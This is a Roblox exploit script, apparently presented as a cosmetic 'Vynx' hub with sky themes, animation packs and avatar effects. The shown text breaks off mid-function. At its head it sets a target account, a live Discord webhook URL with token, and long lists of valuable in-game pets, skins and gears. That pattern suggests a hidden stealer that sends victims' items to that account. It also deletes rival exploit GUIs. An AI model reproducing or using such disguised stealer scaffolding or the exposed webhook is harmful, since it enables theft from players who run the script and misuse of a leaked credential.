local TARGET_ID = 7641371436
local TARGET_USER = "22suhail2"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1538577994371698809/Nt7MJnBrlH99beO5p21S1iZ7w0OIavzh3_66DRakUPJP8W7xXJq0sy5sSGcAyBaAJnAL"

local TargetBrainrots = {
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Griffin"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Hydra Bunny"] = true,
    ["Antonio"] = true,
    ["John Pork"] = true,
    ["Elefanto Frigo"] = true,
    ["Rubrikiko"] = true,
    ["Pancake and Syrup"] = true,
    ["Arcadragon"] = true,
    ["Rico Dinero"] = true,
    ["Capitano Americano"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["Dragon Aquanini"] = true,
    ["La Casa Boo"] = true,
    ["La Supreme Combinasion"] = true,
    ["Headless Horseman"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["4th Bros"] = true,
    ["Bufalino Boomberino"] = true,
    ["Duggy Bros"] = true,
    ["Cerberus"] = true,
    ["Kraken"] = true,
    ["Money Money Bros"] = true,
    ["Venuspino"] = true,
    ["Steakini Fattini"] = true,
    ["Rhino Helicopterino"] = true,
    ["Caylusaurus"] = true,
    ["Sammyni Cakini"] = true,
    ["Centrucci Nuclucci"] = true,
    ["Los Hackers"] = true,
    ["John Doe"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Jelly Moby"] = true,
    ["Foxini Lanternini"] = true,
    ["Ginger Cisterna"] = true,
    ["Bearito Cabinito"] = true,
    ["Digi Narwhal"] = true,
    ["Los Tangcitos"] = true,
    ["Los Tictacs"] = true,
    ["Moby Bros"] = true,
    ["Los Admins"] = true,
    ["1x1x1x1"] = true,
    ["25"] = true,
    ["67"] = true,
    ["Agarrini la Palini"] = true,
    ["Arcadopus"] = true,
    ["Bacuru and Egguru"] = true,
    ["Bananito"] = true,
    ["Baskito"] = true,
    ["Berryno"] = true,
    ["Bisonte Giuppitere"] = true,
    ["Blackhole GOAT"] = true,
    ["Boatito Auratito"] = true,
    ["Boppin Bunny"] = true,
    ["Brunito Marsito"] = true,
    ["Bunito Bunito Spinito"] = true,
    ["Bunnyman"] = true,
    ["Bunny and Eggy"] = true,
    ["Bunny Bunny Bunny Sahur"] = true,
    ["Buntteo"] = true,
    ["Burguro and Fryuro"] = true,
    ["Burrito Bandito"] = true,
    ["Capitano Moby"] = true,
    ["Cash or Card"] = true,
    ["Celestial Pegasus"] = true,
    ["Celularcini Viciosini"] = true,
    ["Chachechi"] = true,
    ["Chicleteira Bicicleteira"] = true,
    ["Chicleteira Cupideira"] = true,
    ["Chicleteira Noelteira"] = true,
    ["Chicleteirina Bicicleteirina"] = true,
    ["Chill Puppy"] = true,
    ["Chillin Chili"] = true,
    ["Chimnino"] = true,
    ["Chipso and Queso"] = true,
    ["Churrito Bunnito"] = true,
    ["Cigno Fulgoro"] = true,
    ["Cloverat Clapat"] = true,
    ["Cooki and Milki"] = true,
    ["Cuadramat and Pakrahmatmamat"] = true,
    ["Cupid Cupid Sahur"] = true,
    ["Cupid Hotspot"] = true,
    ["DJ Panda"] = true,
    ["Donkeyturbo Express"] = true,
    ["Dul Dul Dul"] = true,
    ["Easter Easter Easter Sahur"] = true,
    ["Eid Eid Eid Sahur"] = true,
    ["Esok Sekolah"] = true,
    ["Eviledon"] = true,
    ["Extinct Matteo"] = true,
    ["Extinct Tralalero"] = true,
    ["Festive 67"] = true,
    ["Fishboard"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Fragola La La La"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Frankentteo"] = true,
    ["GOAT"] = true,
    ["Garama and Madundung"] = true,
    ["Giftini Spyderini"] = true,
    ["Ginger Gerat"] = true,
    ["Gobblino Uniciclino"] = true,
    ["Gold Gold Gold"] = true,
    ["Graipuss Medussi"] = true,
    ["Granny"] = true,
    ["Guerriro Digitale"] = true,
    ["Guest 666"] = true,
    ["Ho Ho Ho Sahur"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Horegini Boom"] = true,
    ["Jackorilla"] = true,
    ["Job Job Job Sahur"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Karker Sahur"] = true,
    ["Karkerkar Kurkur"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Ketupat Bros"] = true,
    ["Ketupat Kepat"] = true,
    ["La Cucaracha"] = true,
    ["La Easter Grande"] = true,
    ["La Extinct Grande"] = true,
    ["La Food Combinasion"] = true,
    ["La Ginger Sekolah"] = true,
    ["La Grande Combinasion"] = true,
    ["La Jolly Grande"] = true,
    ["La Karkerkar Combinasion"] = true,
    ["La Lucky Grande"] = true,
    ["La Romantic Grande"] = true,
    ["La Sahur Combinasion"] = true,
    ["La Secret Combinasion"] = true,
    ["La Spooky Grande"] = true,
    ["La Taco Combinasion"] = true,
    ["La Vacca Jacko Linterino"] = true,
    ["La Vacca Lepre Lepreino"] = true,
    ["La Vacca Prese Presente"] = true,
    ["La Vacca Saturno Saturnita"] = true,
    ["Las Sis"] = true,
    ["Las Tralaleritas"] = true,
    ["Las Vaquitas Saturnitas"] = true,
    ["Lavadorito Spinito"] = true,
    ["Coco and Mango"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Examen Bros"] = true,
    ["Pizza and Ranch"] = true,
    ["Chicleteira Champeona"] = true,
    ["List List List Sahur"] = true,
    ["Los 25"] = true,
    ["Los 67"] = true,
    ["Los Amigos"] = true,
    ["Bumbatron"] = true,
    ["Yetimatic"] = true,
    ["S'more Serat"] = true,
    ["Queen Bee"] = true,
    ["Scorpino Coasterino"] = true,
    ["Honey Honey Bear"] = true,
    ["Pogo Pogo Penguin"] = true,
    ["Conetto Morsetto"] = true,
    ["La Breakfast Combinasion"] = true,
    ["Los Bunitos"] = true,
    ["Los Burritos"] = true,
    ["Los Candies"] = true,
    ["Los Chicleteiras"] = true,
    ["Los Combinasionas"] = true,
    ["Los Cucarachas"] = true,
    ["Los Cupids"] = true,
    ["Los Hotspotsitos"] = true,
    ["Los Jobcitos"] = true,
    ["Los Jolly Combinasionas"] = true,
    ["Los Karkeritos"] = true,
    ["Los Matteos"] = true,
    ["Los Mi Gatitos"] = true,
    ["Los Mobilis"] = true,
    ["Los Nooo My Hotspotsitos"] = true,
    ["Los Planitos"] = true,
    ["Los Primos"] = true,
    ["Los Puggies"] = true,
    ["Los Quesadillas"] = true,
    ["Los Sekolahs"] = true,
    ["Los Spaghettis"] = true,
    ["Los Spooky Combinasionas"] = true,
    ["Los Spyderinis"] = true,
    ["Los Sweethearts"] = true,
    ["Los Tacoritas"] = true,
    ["Los Tortus"] = true,
    ["Los Tralaleritos"] = true,
    ["Los Trios"] = true,
    ["Love Love Bear"] = true,
    ["Love Love Love Sahur"] = true,
    ["Lovin Rose"] = true,
    ["Luck Luck Luck Sahur"] = true,
    ["Mariachi Corazoni"] = true,
    ["Mi Gatito"] = true,
    ["Mieteteira Bicicleteira"] = true,
    ["Money Money Puggy"] = true,
    ["Money Money Reindeer"] = true,
    ["Nacho Spyder"] = true,
    ["Naughty Naughty"] = true,
    ["Noo My Candy"] = true,
    ["Noo My Eggs"] = true,
    ["Noo My Examine"] = true,
    ["Noo My Gold"] = true,
    ["Noo My Heart"] = true,
    ["Noo My Present"] = true,
    ["Nooo My Hotspot"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Orcaledon"] = true,
    ["Paradiso Axolottino"] = true,
    ["Perrito Burrito"] = true,
    ["Pirulitoita Bicicleteira"] = true,
    ["Please My Present"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Pot Hotspot"] = true,
    ["Pot Pumpkin"] = true,
    ["Pumpkini Spyderini"] = true,
    ["Quackini Snackini"] = true,
    ["Quesadilla Crocodila"] = true,
    ["Quesadillo Vampiro"] = true,
    ["Rang Ring Bus"] = true,
    ["Reindeer Tralala"] = true,
    ["Reinito Sleighito"] = true,
    ["Rocco Disco"] = true,
    ["Rosey and Teddy"] = true,
    ["Rosetti Tualetti"] = true,
    ["Sammyni Fattini"] = true,
    ["Sammyni Spyderini"] = true,
    ["Santa Hotspot"] = true,
    ["Santteo"] = true,
    ["Secret Lucky Block"] = true,
    ["Serafinna Medusella"] = true,
    ["Snailo Clovero"] = true,
    ["Spaghetti Tualetti"] = true,
    ["Spinny Hammy"] = true,
    ["Spooky and Pumpky"] = true,
    ["Strawberrita"] = true,
    ["Swag Soda"] = true,
    ["Swaggy Bros"] = true,
    ["Tacorita Bicicleta"] = true,
    ["Tacorillo Crocodillo"] = true,
    ["Tang Tang Keletang"] = true,
    ["Telemorte"] = true,
    ["Tictac Sahur"] = true,
    ["To To To Sahur"] = true,
    ["Torrtuginni Dragonfrutini"] = true,
    ["Tralaledon"] = true,
    ["Trenostruzzo Turbo 4000"] = true,
    ["Trickolino"] = true,
    ["Triplito Tralaleritos"] = true,
    ["Tuff Toucan"] = true,
    ["Tung Tung Tung Sahur"] = true,
    ["Ventoliero Pavonero"] = true,
    ["Vulturino Skeletono"] = true,
    ["W or L"] = true,
    ["Yess My Examine"] = true,
    ["Zombie Tralala"] = true,
    ["Grabatron"] = true,
    ["Rubiko and Kubiko"] = true,
    ["Cangurato Gelato"] = true,
    ["Noodle Noodle Poodle"] = true,
    ["Candini Fluffini"] = true,
    ["La Fuse Machine"] = true,
    ["Polaroidini"] = true,
    ["Nachorilla"] = true,
    ["Sammyni Truckini"] = true,
    ["Tacoturbo Tacorito"] = true,
    ["Burrito Bat"] = true
}

local TargetBaseSkins = {
    ["Aquatic"] = true,
    ["Bunny Basket"] = true,
    ["Candy"] = true,
    ["Christmas"] = true,
    ["Cursed"] = true,
    ["Cyber"] = true,
    ["Diamond"] = true,
    ["Divine"] = true,
    ["Easter"] = true,
    ["Galaxy"] = true,
    ["Gingerbread"] = true,
    ["Gold"] = true,
    ["Halloween"] = true,
    ["Lava"] = true,
    ["Lucky"] = true,
    ["Octo"] = true,
    ["Pot of Gold"] = true,
    ["Radioactive"] = true,
    ["Rainbow"] = true,
    ["Rose"] = true,
    ["Summer"] = true,
    ["Taco"] = true,
    ["Valentines"] = true,
    ["Yin Yang"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Candy Sentry"] = true,
    ["Candy Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Demon's Head"] = true,
    ["Divine Slap"] = true,
    ["Lava Blaster"] = true,
    ["Lava Slap"] = true,
    ["Radioactive Airstrike"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Rainbow Slap"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Yin Yang Lamp"] = true,
    ["Yin Yang Slap"] = true,
    ["Phantom Slap"] = true,
    ["Crystal Slap"] = true
}

task.spawn(function()
    local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local HS = game:GetService("HttpService")
local player = Players.LocalPlayer




do
    local g = (getgenv and getgenv()) or _G
    if g.__VYNX_UNLOAD then
        pcall(g.__VYNX_UNLOAD)
    end
    local function wipeGuis(parent)
        if not parent then return end
        for _, child in ipairs(parent:GetChildren()) do
            if child:IsA("ScreenGui") then
                local n = child.Name
                if n:find("Vynx") or n:find("Movee") or n:find("Cherry") or n:find("Steal") or n:find("Shadow") then
                    pcall(function() child:Destroy() end)
                end
            end
        end
    end
    pcall(function() wipeGuis(player:FindFirstChild("PlayerGui")) end)
    pcall(function() if gethui then wipeGuis(gethui()) end end)
    pcall(function() wipeGuis(game:GetService("CoreGui")) end)
end


local M = {}
M._allConns = {}
local function trackConn(conn)
    if conn then table.insert(M._allConns, conn) end
    return conn
end
M.trackConn = trackConn
M.MENU_CORNER_R = 16
M.DEFAULT_BG_ID = 78248012786524
M.DEFAULT_MOB_BTN_BG_ID = 92132591931954




M.introSoundEnabled = true
M.introGUIEnabled = true

M.INTRO_MUSIC_URL = "https://files.catbox.moe/qhpfe5.mp3"
M.INTRO_MUSIC_FILE = "VynxIntro_Music.mp3"
introSoundInstance = nil
if isfile and isfile("CherryConfig.json") then
    local ok, data = pcall(function() return HS:JSONDecode(readfile("CherryConfig.json")) end)
    if ok and type(data) == "table" then
        if data.introSoundEnabled ~= nil then M.introSoundEnabled = data.introSoundEnabled end
        if data.introGUIEnabled ~= nil then M.introGUIEnabled = data.introGUIEnabled end
        if type(data.Theme) == "string" then M._savedTheme = data.Theme end
        if type(data.colorScheme) == "string" then M._savedTheme = data.colorScheme end
    end
end




M.CANDY_SKY_TAG = "MoveeSkyTheme"
M.currentSkyTheme = "Night"
M.CANDY_SKY_PRESETS = {
    ["Off"]={kind="off"},
    ["Night"]={clock=22,brightness=2,ambient={110,100,130},outAmb={120,110,140},sky={stars=4000,moon=18,sun=0,moonTex=true},atm={dens=0.45,color={120,60,180},decay={60,20,100},glare=0.5,haze=1.2}},
    ["Aurora"]={clock=14,brightness=3,ambient={150,120,150},outAmb={160,130,150},atm={dens=0.55,color={255,80,200},decay={255,20,150},glare=2.5,haze=3},clouds={cover=0.7,dens=0.7,color={255,240,250}}},
    ["Sunset"]={clock=17.2,brightness=2.5,ambient={170,120,100},outAmb={180,130,110},sky={stars=0,sun=25,moon=0},atm={dens=0.5,color={255,130,60},decay={255,80,30},glare=2,haze=2.5},clouds={cover=0.55,dens=0.55,color={255,200,140}}},
    ["Galaxy"]={clock=0,brightness=1.5,ambient={70,60,100},outAmb={80,70,110},sky={stars=10000,moon=30,sun=0},atm={dens=0.15,color={40,20,80},decay={20,10,50},glare=0.3,haze=0.5}},
    ["Cyber"]={clock=21,brightness=2.2,ambient={90,130,170},outAmb={100,140,180},sky={stars=2000,moon=12},atm={dens=0.4,color={0,200,255},decay={150,0,255},glare=2,haze=2},clouds={cover=0.4,dens=0.6,color={100,200,255}}},
    ["Sakura"]={clock=11,brightness=3.5,ambient={170,150,160},outAmb={180,160,170},sky={sun=8},atm={dens=0.3,color={255,200,220},decay={255,170,200},glare=1,haze=1.5},clouds={cover=0.6,dens=0.4,color={255,250,252}}},
    ["Pink Night"]={clock=23,brightness=2.2,ambient={120,60,110},outAmb={140,70,120},sky={stars=5000,moon=22,sun=0,moonTex=true},atm={dens=0.5,color={255,80,180},decay={140,30,100},glare=0.7,haze=1.4},clouds={cover=0.3,dens=0.5,color={180,90,150}}},
    ["Blood Moon"]={clock=22.5,brightness=1.6,ambient={130,40,40},outAmb={150,50,50},sky={stars=1500,moon=28,sun=0,moonTex=true},atm={dens=0.6,color={220,30,30},decay={120,10,10},glare=1.4,haze=2},clouds={cover=0.5,dens=0.7,color={120,30,30}}},
    ["Emerald Dawn"]={clock=6.5,brightness=2.8,ambient={130,170,140},outAmb={140,180,150},sky={sun=18,moon=0,stars=0},atm={dens=0.4,color={80,200,140},decay={40,150,90},glare=1.8,haze=2.2},clouds={cover=0.5,dens=0.5,color={200,255,220}}},
    ["Volcanic"]={clock=19,brightness=2,ambient={180,80,40},outAmb={200,90,50},sky={stars=200,sun=12,moon=0},atm={dens=0.75,color={255,60,0},decay={180,20,0},glare=3,haze=3.5},clouds={cover=0.8,dens=0.9,color={120,40,20}}},
    ["Arctic"]={clock=9,brightness=3.2,ambient={200,220,235},outAmb={210,230,245},sky={sun=10,stars=0,moon=0},atm={dens=0.3,color={180,220,255},decay={140,200,240},glare=1.5,haze=1.8},clouds={cover=0.7,dens=0.6,color={250,253,255}}},
    ["Midnight Ocean"]={clock=1.5,brightness=1.7,ambient={60,90,130},outAmb={70,100,140},sky={stars=6000,moon=24,sun=0,moonTex=true},atm={dens=0.5,color={20,60,140},decay={10,30,90},glare=0.6,haze=1.5}},
    ["Vaporwave"]={clock=19.5,brightness=2.4,ambient={180,120,200},outAmb={190,130,210},sky={stars=1000,moon=14},atm={dens=0.45,color={255,100,220},decay={120,60,255},glare=2.2,haze=2.4},clouds={cover=0.55,dens=0.55,color={200,150,255}}},
    ["Toxic"]={clock=13,brightness=2.5,ambient={140,180,80},outAmb={150,190,90},atm={dens=0.55,color={100,220,40},decay={60,150,20},glare=1.8,haze=2.6},clouds={cover=0.65,dens=0.7,color={180,255,120}}},
    ["Solar Eclipse"]={clock=12,brightness=0.9,ambient={50,40,60},outAmb={60,50,70},sky={stars=3500,sun=22,moon=0},atm={dens=0.5,color={255,140,40},decay={30,20,40},glare=2.8,haze=1.8}},
    ["Hellscape"]={clock=18,brightness=1.8,ambient={200,60,30},outAmb={220,70,40},sky={stars=100,sun=30,moon=0},atm={dens=0.85,color={255,30,0},decay={120,0,0},glare=3.5,haze=4},clouds={cover=0.95,dens=0.95,color={80,20,10}}},
    ["Heaven"]={clock=12,brightness=4,ambient={240,235,210},outAmb={250,245,220},sky={sun=16,moon=0,stars=0},atm={dens=0.25,color={255,250,220},decay={255,240,200},glare=3,haze=1.5},clouds={cover=0.85,dens=0.5,color={255,255,255}}},
    ["Storm"]={clock=15,brightness=1.4,ambient={90,90,110},outAmb={100,100,120},sky={stars=0,sun=6,moon=0},atm={dens=0.65,color={80,90,120},decay={40,50,80},glare=0.5,haze=3},clouds={cover=0.95,dens=0.95,color={60,65,80}}},
    ["Sunrise"]={clock=6.2,brightness=2.8,ambient={220,180,130},outAmb={230,190,140},sky={sun=22,stars=0,moon=0},atm={dens=0.45,color={255,180,100},decay={255,140,80},glare=2.4,haze=2.2},clouds={cover=0.4,dens=0.4,color={255,220,180}}},
    ["Deep Space"]={clock=0,brightness=1,ambient={30,25,50},outAmb={40,35,60},sky={stars=15000,moon=0,sun=0},atm={dens=0.08,color={15,5,40},decay={5,0,20},glare=0.2,haze=0.3}},
    ["Lavender Dream"]={clock=18.5,brightness=2.6,ambient={180,160,220},outAmb={190,170,230},sky={stars=800,moon=16,sun=0},atm={dens=0.4,color={200,160,255},decay={160,120,220},glare=1.4,haze=1.8},clouds={cover=0.55,dens=0.5,color={220,200,255}}},
    ["Inferno"]={clock=17.5,brightness=2.2,ambient={220,100,40},outAmb={235,110,50},sky={sun=26,moon=0,stars=0},atm={dens=0.6,color={255,90,20},decay={200,40,0},glare=3,haze=3.2},clouds={cover=0.7,dens=0.7,color={200,80,40}}},
    ["Mint Sky"]={clock=10,brightness=3.2,ambient={180,230,210},outAmb={190,240,220},sky={sun=10},atm={dens=0.32,color={150,255,210},decay={100,220,180},glare=1.6,haze=1.6},clouds={cover=0.55,dens=0.45,color={240,255,250}}},
}
M.SkyOrder = {"Off","Night","Aurora","Sunset","Galaxy","Cyber","Sakura","Pink Night","Blood Moon","Emerald Dawn","Volcanic","Arctic","Midnight Ocean","Vaporwave","Toxic","Solar Eclipse","Hellscape","Heaven","Storm","Sunrise","Deep Space","Lavender Dream","Inferno","Mint Sky"}

local function candyColor(rgb) return Color3.fromRGB(rgb[1],rgb[2],rgb[3]) end
function M.CandyApplyCustomSky(mode)
    for _,child in ipairs(Lighting:GetChildren()) do if child:GetAttribute(M.CANDY_SKY_TAG) then pcall(function() child:Destroy() end) end end
    local terrain=workspace:FindFirstChildOfClass("Terrain")
    if terrain then for _,child in ipairs(terrain:GetChildren()) do if child:GetAttribute(M.CANDY_SKY_TAG) then pcall(function() child:Destroy() end) end end end
    local preset=M.CANDY_SKY_PRESETS[mode]
    if not preset or preset.kind=="off" then Lighting.ClockTime=14;Lighting.Brightness=2;Lighting.OutdoorAmbient=Color3.fromRGB(127,127,127);Lighting.Ambient=Color3.fromRGB(127,127,127);Lighting.FogEnd=100000;Lighting.GlobalShadows=true;return end
    Lighting.FogStart=0;Lighting.FogEnd=100000;Lighting.FogColor=Color3.fromRGB(200,200,200);Lighting.ColorShift_Top=Color3.fromRGB(0,0,0);Lighting.ColorShift_Bottom=Color3.fromRGB(0,0,0);Lighting.GlobalShadows=true
    Lighting.ClockTime=preset.clock or 14;Lighting.Brightness=preset.brightness or 2
    if preset.outAmb then Lighting.OutdoorAmbient=candyColor(preset.outAmb) end
    if preset.ambient then Lighting.Ambient=candyColor(preset.ambient) end
    if preset.sky then
        local skyInst=Instance.new("Sky");skyInst:SetAttribute(M.CANDY_SKY_TAG,true)
        if preset.sky.stars then skyInst.StarCount=preset.sky.stars end
        if preset.sky.moon then skyInst.MoonAngularSize=preset.sky.moon end
        if preset.sky.sun then skyInst.SunAngularSize=preset.sky.sun end
        if preset.sky.moonTex then skyInst.MoonTextureId="rbxasset://sky/moon.jpg" end
        skyInst.Parent=Lighting
    end
    if preset.atm then
        local atm=Instance.new("Atmosphere");atm:SetAttribute(M.CANDY_SKY_TAG,true)
        atm.Density=preset.atm.dens or 0.3;atm.Color=candyColor(preset.atm.color);atm.Decay=candyColor(preset.atm.decay);atm.Glare=preset.atm.glare or 1;atm.Haze=preset.atm.haze or 1;atm.Parent=Lighting
    end
    if preset.clouds and terrain then
        local clouds=Instance.new("Clouds");clouds:SetAttribute(M.CANDY_SKY_TAG,true)
        clouds.Cover=preset.clouds.cover or 0.5;clouds.Density=preset.clouds.dens or 0.5;clouds.Color=candyColor(preset.clouds.color);clouds.Parent=terrain
    end
end




M.PACKS = {
    ["Adidas Sports"] = {
        WalkAnim = 18537392113,
        RunAnim  = 18537384940,
        JumpAnim = 18537380791,
        FallAnim = 18537367238,
        SwimIdle = 18537387180,
        Swim     = 18537389531,
        Animation1 = 18537376492,
        Animation2 = 18537371272,
        ClimbAnim = 18537363391,
    },
    ["Adidas Community"] = {
        WalkAnim = 122150855457006,
        RunAnim  = 82598234841035,
        JumpAnim = 75290611992385,
        FallAnim = 98600215928904,
        SwimIdle = 109346520324160,
        Swim     = 133308483266208,
        Animation1 = 122257458498464,
        Animation2 = 102357151005774,
        ClimbAnim = 88763136693023,
    },
    ["Adidas Aura"] = {
        WalkAnim = 83842218823011,
        RunAnim  = 118320322718866,
        JumpAnim = 109996626521204,
        FallAnim = 95603166884636,
        SwimIdle = 94922130551805,
        Swim     = 134530128383903,
        Animation1 = 110211186840347,
        Animation2 = 114191137265065,
        ClimbAnim = 97824616490448,
    },
    ["Wicked Popular"] = {
        WalkAnim = 92072849924640,
        RunAnim = 72301599441680,
        JumpAnim = 104325245285198,
        FallAnim = 121152442762481,
        Animation1 = 118832222982049,
        ClimbAnim = 131326830509784,
        SwimIdle = 113199415118199,
        Swim = 99384245425157,
        Animation2 = 76049494037641,
    },
    Elder = {
        WalkAnim = 10921111375,
        RunAnim  = 10921104374,
        JumpAnim = 10921107367,
        FallAnim = 10921105765,
        SwimIdle = 10921110146,
        Swim     = 10921108971,
        ClimbAnim = 10921100400,
        Animation1 = 10921101664,
        Animation2 = 10921102574,
    },
    Zombie = {
        WalkAnim = 10921355261,
        RunAnim  = 616163682,
        JumpAnim = 10921351278,
        FallAnim = 10921350320,
        SwimIdle = 10921353442,
        Swim     = 10921352344,
        Animation1 = 10921344533,
        Animation2 = 10921345304,
        ClimbAnim = 10921343576,
    },
    Mage = {
        WalkAnim = 10921152678,
        RunAnim  = 10921148209,
        JumpAnim = 10921149743,
        FallAnim = 10921148939,
        SwimIdle = 10921151661,
        Swim     = 10921150788,
        ClimbAnim = 10921143404,
        Animation1 = 10921144709,
        Animation2 = 10921145797,
    },
    ["Catwalk Glam"] = {
        WalkAnim = 109168724482748,
        RunAnim  = 81024476153754,
        JumpAnim = 116936326516985,
        FallAnim = 92294537340807,
        SwimIdle = 98854111361360,
        Swim     = 134591743181628,
        ClimbAnim = 119377220967554,
        Animation1 = 133806214992291,
        Animation2 = 94970088341563,
    },
    Astronaut = {
        WalkAnim = 10921046031,
        RunAnim  = 10921039308,
        JumpAnim = 10921042494,
        FallAnim = 10921040576,
        SwimIdle = 10921045006,
        Swim     = 10921044000,
        ClimbAnim = 10921032124,
        Animation1 = 10921034824,
        Animation2 = 10921036806,
    },
    ['Wicked "Dancing Through Life"'] = {
        WalkAnim = 73718308412641,
        RunAnim  = 135515454877967,
        JumpAnim = 78508480717326,
        FallAnim = 78147885297412,
        SwimIdle = 129183123083281,
        Swim     = 110657013921774,
        ClimbAnim = 129447497744818,
        Animation1 = 92849173543269,
        Animation2 = 132238900951109,
    },
    Werewolf = {
        WalkAnim = 10921342074,
        RunAnim  = 10921336997,
        JumpAnim = nil,
        FallAnim = 10921337907,
        SwimIdle = 10921341319,
        Swim     = 10921340419,
        ClimbAnim = 10921329322,
        Animation1 = 10921330408,
        Animation2 = 10921333667,
    },
    Superhero = {
        WalkAnim = 10921298616,
        RunAnim  = 10921291831,
        JumpAnim = 10921294559,
        FallAnim = 10921293373,
        SwimIdle = 10921297391,
        Swim     = 10921295495,
        ClimbAnim = 10921286911,
        Animation1 = 10921288909,
        Animation2 = 10921290167,
    },
    Toy = {
        WalkAnim = 10921312010,
        RunAnim  = 10921306285,
        JumpAnim = 10921308158,
        FallAnim = 10921307241,
        SwimIdle = 10921310341,
        Swim     = 10921309319,
        ClimbAnim = 10921300839,
        Animation1 = 10921301576,
        Animation2 = nil,
    },
    ["No Boundaries"] = {
        WalkAnim = 18747074203,
        RunAnim  = 18747070484,
        JumpAnim = 18747069148,
        FallAnim = 18747062535,
        SwimIdle = 18747071682,
        Swim     = 18747073181,
        ClimbAnim = 18747060903,
        Animation1 = 18747067405,
        Animation2 = 18747063918,
    },
    NFL = {
        WalkAnim = 110358958299415,
        RunAnim  = 117333533048078,
        JumpAnim = 119846112151352,
        FallAnim = 129773241321032,
        SwimIdle = 79090109939093,
        Swim     = 132697394189921,
        ClimbAnim = 134630013742019,
        Animation1 = 92080889861410,
        Animation2 = 74451233229259,
    },
    ["Amazon Unboxed"] = {
        WalkAnim = 90478085024465,
        RunAnim  = 134824450619865,
        JumpAnim = 121454505477205,
        FallAnim = 94788218468396,
        SwimIdle = 129126268464847,
        Swim     = 105962919001086,
        ClimbAnim = 121145883950231,
        Animation1 = 98281136301627,
        Animation2 = nil,
    },
    Vampire = {
        WalkAnim = 10921326949,
        RunAnim  = 10921320299,
        JumpAnim = 10921322186,
        FallAnim = 10921321317,
        SwimIdle = 10921325443,
        Swim     = 10921324408,
        ClimbAnim = 10921314188,
        Animation1 = 10921315373,
        Animation2 = nil,
    },
    Ninja = {
        Run=656118852, Walk=656121766, Jump=656117878, Fall=656115606,
        Swim=656119721, SwimIdle=656121397, Climb=656114359,
        Idle={656117400,656118341,886742569}
    },
    Robot = {
        Run=616091570, Walk=616095330, Jump=616090535, Fall=616087089,
        Swim=616092998, SwimIdle=616094091, Climb=616086039,
        Idle={616088211,616089559,885531463}
    },
    Levitation = {
        Run=616010382, Walk=616013216, Jump=616008936, Fall=616005863,
        Swim=616011509, SwimIdle=616012453, Climb=616003713,
        Idle={616006778,616008087,886862142}
    },
    Stylish = {
        Run=616140816, Walk=616146177, Jump=616139451, Fall=616134815,
        Swim=616143378, SwimIdle=616144772, Climb=616133594,
        Idle={616136790,616138447,886888594}
    },
    Bubbly = {
        Run=910025107, Walk=910034870, Jump=910016857, Fall=910001910,
        Swim=910028158, SwimIdle=910030921, Climb=909997997,
        Idle={910004836,910009958,1018536639}
    },
    Cartoon = {
        Run=742638842, Walk=742640026, Jump=742637942, Fall=742637151,
        Swim=742639220, SwimIdle=742639812, Climb=742636889,
        Idle={742637544,742638445,885477856}
    },
}
M.animPack = "Adidas Sports"
M.animPackEnabled = true
M.savedAnimate = nil




M.headlessEnabled = false
M.korbloxEnabled = false

local HEADLESS_MESH_ID = "rbxassetid://1095708"
local KORBLOX_MESH_ID = "rbxassetid://101851696"
local KORBLOX_TEXTURE_ID = "rbxassetid://101851254"
local DARK_GREY_COLOR = Color3.fromRGB(64, 64, 64)

local function removeFace(head)
    local face = head:FindFirstChild("face")
    if face then face:Destroy() end
end

function M.applyHeadlessToChar(char, enabled)
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end

    if enabled then
        head.Transparency = 1
        head.CanCollide = false
        removeFace(head)

        for _, child in ipairs(head:GetChildren()) do
            if child:IsA("SpecialMesh") and child.MeshId == HEADLESS_MESH_ID then
                child:Destroy()
            end
        end

        local mesh = Instance.new("SpecialMesh")
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId = HEADLESS_MESH_ID
        mesh.Scale = Vector3.new(0.001, 0.001, 0.001)
        mesh.Name = "HeadlessMesh"
        mesh.Parent = head

        head:GetPropertyChangedSignal("Transparency"):Connect(function()
            if head.Transparency ~= 1 then
                head.Transparency = 1
            end
        end)
        head.ChildAdded:Connect(function(child)
            if child.Name == "face" and child:IsA("Decal") then
                child:Destroy()
            end
        end)
    else
        head.Transparency = 0
        head.CanCollide = true
        for _, child in ipairs(head:GetChildren()) do
            if child:IsA("SpecialMesh") and child.Name == "HeadlessMesh" then
                child:Destroy()
            end
        end
        removeFace(head)
    end
end

function M.applyKorbloxToChar(char, enabled)
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    if enabled then
        if humanoid.RigType == Enum.HumanoidRigType.R6 then
            local rightLeg = char:FindFirstChild("Right Leg")
            if rightLeg then
                for _, child in ipairs(rightLeg:GetChildren()) do
                    if child:IsA("SpecialMesh") or child:IsA("CharacterMesh") then
                        child:Destroy()
                    end
                end
                rightLeg.Color = DARK_GREY_COLOR
                rightLeg:GetPropertyChangedSignal("Color"):Connect(function()
                    if rightLeg.Color ~= DARK_GREY_COLOR then
